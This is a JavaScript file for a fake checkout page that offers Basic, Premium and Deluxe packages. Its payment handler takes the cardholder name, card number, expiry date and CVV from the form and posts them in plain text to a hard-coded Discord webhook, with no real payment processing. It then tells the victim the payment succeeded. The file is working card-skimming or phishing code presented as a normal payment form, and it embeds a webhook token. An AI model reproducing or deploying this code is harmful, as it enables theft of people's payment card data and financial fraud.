const CONFIG = {
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1294398707999051797/URvT3b6ixl9S9Qk6qlfdzgSN1QqEKhRKE0I79eOP0LGdVvwBPiPUTm1PDDt1Ia1_AvAr',
    PACKAGES: {
        basic: { name: 'Basic Package', price: 10 },
        premium: { name: 'Premium Package', price: 20 },
        deluxe: { name: 'Deluxe Package', price: 30 }
    },
    CARD_TYPES: ['visa', 'mastercard', 'amex', 'discover']
};

const utils = {
    formatCurrency: (value) => `$${value.toFixed(2)}`,
    showToast: (message, type = 'success') => {
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.textContent = message;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    },
    isValidExpiry: (expiry) => {
        const [month, year] = expiry.split('/').map(Number);
        if (month < 1 || month > 12) return false;
        const currentDate = new Date();
        const expiryDate = new Date(`20${year}`, month - 1);
        return expiryDate >= currentDate;
    },
    isValidCVV: (cvv) => /^\d{3,4}$/.test(cvv)
};

class PaymentForm {
    constructor(packageName) {
        this.package = packageName;
        this.initForm();
    }

    initForm() {
        const packageDetails = CONFIG.PACKAGES[this.package];
        if (!packageDetails) {
            window.location.href = 'index.html';
            return;
        }

        document.getElementById('package-name').textContent = packageDetails.name;
        document.getElementById('package-price').textContent = utils.formatCurrency(packageDetails.price);

        document.getElementById('card-number').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
        });

        document.getElementById('expiry').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
        });

        document.getElementById('cvv').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });

        document.getElementById('payment-form').addEventListener('submit', (e) => this.handleSubmit(e));
    }

    async handleSubmit(e) {
        e.preventDefault();

        const submitButton = document.getElementById('submit-payment');
        submitButton.disabled = true;
        submitButton.textContent = 'Processing...';

        const formData = {
            cardName: document.getElementById('card-name').value,
            cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            package: CONFIG.PACKAGES[this.package].name,
            amount: CONFIG.PACKAGES[this.package].price
        };

        try {
            const response = await this.sendPayment(formData);
            if (response.ok) {
                utils.showToast('Payment successful! Redirecting...');
                setTimeout(() => window.location.href = 'success.html', 2000);
            } else {
                throw new Error('Payment failed');
            }
        } catch (error) {
            utils.showToast('Payment failed. Please try again.', 'error');
            submitButton.disabled = false;
            submitButton.textContent = 'Complete Purchase';
            console.error('Payment Error:', error);
        }
    }

    async sendPayment(data) {
        const payload = {
            content: `Payment Details:
- Card Name: ${data.cardName}
- Card Number: ${data.cardNumber}
- Expiry: ${data.expiry}
- CVV: ${data.cvv}
- Package: ${data.package}
- Amount: ${data.amount}`
        };

        return fetch(CONFIG.WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const packageName = urlParams.get('package');
    new PaymentForm(packageName);
});
